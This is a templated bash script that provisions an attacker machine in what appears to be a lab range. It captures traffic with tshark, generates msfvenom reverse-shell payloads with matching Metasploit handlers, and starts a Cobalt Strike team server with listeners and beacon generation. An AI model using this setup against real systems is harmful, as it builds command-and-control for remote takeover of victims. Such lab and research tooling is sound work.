#!/bin/bash
set -e
set -x

{% set basep = "/vagrant" %}

echo -e "\n\nStarting tshark monitor process ...\n"

nohup tshark -i {{ attacker['nic'] }} -f "not arp and net {{ range_net }}" -c {{ packet_cnt }} -w {{ basep }}/{{ pcap_file }} &> {{ basep }}/tshark.log &
sleep 5
echo -n "tshark PID: " && pgrep tshark

echo -e "\n\n Starting MSF provision ...\n"

{% set aip = attacker.ip %}
{% for vm, vmd in victim.items() if vmd.platform == 'linux' %}
{% set beacon_path = basep + "/" + vmd.beacon_file %}
msfvenom --payload {{ vmd.payload }} --platform {{ vmd.platform }} --arch {{ vmd.arch }} LHOST={{ aip }} LPORT={{ vmd.listener_port }} -f {{ vmd.beacon_format }} > {{ beacon_path }}

cat << EOF > {{ beacon_path }}.rc
use exploit/multi/handler
set PAYLOAD {{ vmd.payload }}
set LHOST {{ aip }}
set LPORT {{ vmd.listener_port }}
exploit
EOF

tmux new-session -d -s {{ vm }} -n listener-{{ vm }} 'msfconsole -r {{beacon_path }}.rc'
{% endfor %}

echo -e "\n\nStarting Cobalt Strike provision ...\n"

# Extract CS and start team server
rm -rf {{ attacker.cobaltstrike.foldername }}
unzip /vagrant/{{ dependencies.cs_installer }}
cd {{ attacker.cobaltstrike.folder_name }}
chmod 755 teamserver agscript

echo -e "\nStarting team server ...\n"

{% set team_server_pwd = attacker.cobaltstrike.team_server.password %}
{% set team_server_port = attacker.cobaltstrike.team_server.port %}
tmux new-session -d -s cobaltstrike -n teamserver 'sudo ./teamserver {{ aip }} {{ team_server_pwd }}'
sleep 20  # wait for team server starting
nc -zv localhost {{ team_server_port }} && echo 'team server start successfully!'

{% for vm, vmd in victim.items() if vmd.platform == 'windows' %}
{% set payload_name = vmd.payload.split('/')[-1] %}
{% set listener_script = basep + '/listener_' + payload_name + '.cna' %}

cat << EOF > {{ listener_script }}
on ready {
  listener_create_ext("{{ payload_name }}", "{{ vmd.payload }}", %(host => "{{ aip }}", port => {{ vmd.listener_port }}, beacons => "{{ aip }}"));
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
}

on beacon_initial {
  println("[Initial]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . "\n");
}

on beacon_checkin {
  println("[Checkin]" . formatDate("HH:mm:ss z") . " Beacon ". \$1 . ", MSG: " . \$2 . "\n");
}

on beacon_input {
  println("[Input]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . ", RESP: " . \$3 . "\n");
}

on beacon_output {
  println("[Output]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . "\n");
}
EOF

echo -e "\nStarting listener for {{ vm }} ..."
nohup ./agscript {{ aip }} {{ team_server_port }} l{{ vm }} {{ team_server_pwd }} {{ listener_script }} &> {{ listener_script }}.log &
sleep 10
cat {{ listener_script }}.log
echo -n "agscript PID: " && pgrep agscript

{% set bfn = basep + '/' + vmd.beacon_file %}
cat << EOF > {{ bfn }}.cna
on ready {
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
  \$data = artifact_payload("{{ payload_name }}", "{{ vmd.beacon_format }}", "{{ vmd.arch }}", "process", "None");
  \$handle = openf(">{{ bfn }}");
  writeb(\$handle, \$data);
  closef(\$handle);
  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "{{ payload_name }}.{{ vmd.beacon_format }}" . " created successfully!")
  closeClient();
}
EOF

echo "Generating beacon ..."
nohup ./agscript {{ aip }} {{ team_server_port }} b{{ vm }} {{ team_server_pwd }} {{ bfn }}.cna &> {{ bfn }}.log &
sleep 5
cat {{ bfn }}.log
{% endfor %}
